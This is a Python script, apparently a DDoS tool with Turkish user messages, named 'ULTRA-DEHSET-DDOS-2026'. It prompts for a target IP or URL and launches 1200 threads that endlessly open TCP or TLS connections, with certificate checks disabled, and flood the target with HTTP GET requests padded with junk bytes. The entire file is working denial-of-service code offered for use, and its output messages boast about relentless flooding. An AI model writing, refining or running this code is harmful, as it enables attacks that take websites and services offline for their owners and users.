# ULTRA-DEHSET-DDOS-2026.py

import socket
import threading
import random
import time
import sys
from urllib.parse import urlparse

target = input("Hedef (IP veya tam URL): ").strip()

threads = 1200
sleep_between = 0.0001
timeout = 2

if target.startswith(('http://', 'https://')):
    u = urlparse(target)
    host = u.hostname
    port = 443 if u.scheme == 'https' else 80
    path = u.path or '/'
    https = u.scheme == 'https'
else:
    host = target
    port = 80
    path = '/'
    https = False

print(f"→ Hedef: {host}:{port}  path: {path}  https: {https}")
print(f"→ {threads} thread – ultra dehşet modu aktif")

ua_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "curl/8.9.1", "python-requests/2.32.3",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Mobile",
    "Googlebot/2.1"
]

junk = b"GET " + bytes(path, 'utf-8') + b" HTTP/1.1\r\n" + \
       b"Host: " + bytes(host, 'utf-8') + b"\r\n" + \
       b"User-Agent: " + random.choice(ua_list).encode() + b"\r\n" + \
       b"Accept: */*\r\n" + \
       b"Connection: keep-alive\r\n\r\n" + \
       bytes(''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=128)), 'utf-8')

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))

            if https:
                import ssl
                ctx = ssl._create_unverified_context()
                s = ctx.wrap_socket(s, server_hostname=host)

            while True:
                s.send(junk)
                time.sleep(sleep_between)
        except:
            try: s.close()
            except: pass

for _ in range(threads):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

print("→ ULTRA DEHŞET BAŞLATILDI – telefon yanana kadar durmaz")
print("→ Ctrl+C ile ancak kurtulursun\n")

try:
    while True: time.sleep(86400)
except KeyboardInterrupt:
    sys.exit(0)
